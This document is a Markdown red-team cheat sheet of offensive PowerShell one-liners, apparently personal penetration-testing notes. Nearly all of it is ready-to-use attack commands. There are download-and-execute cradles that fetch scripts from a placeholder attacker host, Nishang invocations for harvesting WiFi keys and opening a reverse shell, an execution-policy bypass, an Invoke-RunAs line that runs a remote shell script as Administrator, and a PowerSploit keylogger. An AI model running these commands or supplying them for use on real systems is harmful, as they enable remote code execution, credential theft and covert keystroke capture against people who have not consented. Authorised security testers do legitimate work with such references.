# PowerShell
[RedTeam_CheatSheet.ps1 · GitHub](https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70)

- - - -
## Basic commands
### download file
`IEX(New-Object Net.WebClient).downloadString('<url>')`
or
`IEX(IWR('<url>'))`

### Get-Content (like type / cat)
`Get-Content <file>`

### check architecture
`[environment]::Is64OperatingSystem`
`[environment]::Is64BitProcess`

64bit PowerShell path
`C:\Windows\SysNative\WindowsPowerShell\v1.0\PowerShell`

### whoami
`whoami /all`  -> SeImpersonatePrivilege (RottenTomato)

### base64 encode file
```
$fc = Get-Content "filename"
$fe = [System.Text.Encoding]::UTF8.GetBytes($fc)
[System.Convert]::ToBase64String($fe)
```

- - - -
## Nishang
Offensive PowerShell for red team, penetration testing and offensive security.
[GitHub - samratashok/nishang](https://github.com/samratashok/nishang)

gather information
`powershell -ExecutionPolicy bypass -file Get-Information.ps1 > results.txt`

get wifi creds
`.\Get-WLAN-Keys.ps1`

**reverse shell**
`/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1`
append `Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port <port>` to `Invoke-PowerShellTcp.ps1`  to automatically execute the shell

**remote execution**
`powershell IEX (New-Object System.Net.WebClient).DownloadString('http://<ip>/Invoke-PowerShellTcp.ps1')`

`powershell -NoProfile -ExecutionPolicy unrestricted -Command IEX (New-Object System.Net.WebClient).DownloadString('http://<ip>/Invoke-PowerShellTcp.ps1')`

- - - -
## PowerShell-Suite
This is a collection of PowerShell utilities I put together either for fun or because I had a narrow application in mind.
[GitHub - FuzzySecurity/PowerShell-Suite](https://github.com/FuzzySecurity/PowerShell-Suite)

`Invoke-RunAs.ps1 `

`Invoke-RunAs -User Administrator -Password <pw> -LogonType 0x1 -Binary c:\Windows\SysNative\WindowsPowerShell\v1.0\PowerShell.exe -Args "IEX(New-Object Net.WebClient).downloadString('http://<ip>/shell.ps1')"`
-> Put at the bottom of Invoke-RunAs.ps1, if not working otherwise

- - - -
## keylogger
`IEX (New-Object Net.WebClient).DownloadString('https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1)`
`Get-Keystrokes -LogPath C:\key.log -CollectionInterval 1`

- - - -